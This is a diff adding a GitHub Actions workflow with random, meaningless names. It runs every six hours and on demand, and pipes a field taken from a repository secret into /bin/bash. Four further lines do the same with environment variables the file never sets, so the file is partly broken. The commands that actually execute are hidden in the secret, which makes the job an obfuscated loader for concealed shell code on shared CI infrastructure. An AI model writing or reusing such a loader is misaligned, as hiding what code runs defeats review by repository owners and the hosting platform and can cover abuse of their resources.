@@ -1,0 +1,21 @@
+name: xueguochengf
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueguochengf
+        env:
+          ihv51: ${{ secrets.ihv51 }}
+        run: |
+          echo $ihv51 | jq -r .mv5028 | /bin/bash
+          echo $iltou24 | jq -r .zy7 | /bin/bash
+          echo $ph152 | jq -r .twcxg210 | /bin/bash
+          echo $vnq107 | jq -r .mxu83 | /bin/bash
+          echo $ojfdv5 | jq -r .fkvqw9942 | /bin/bash
+
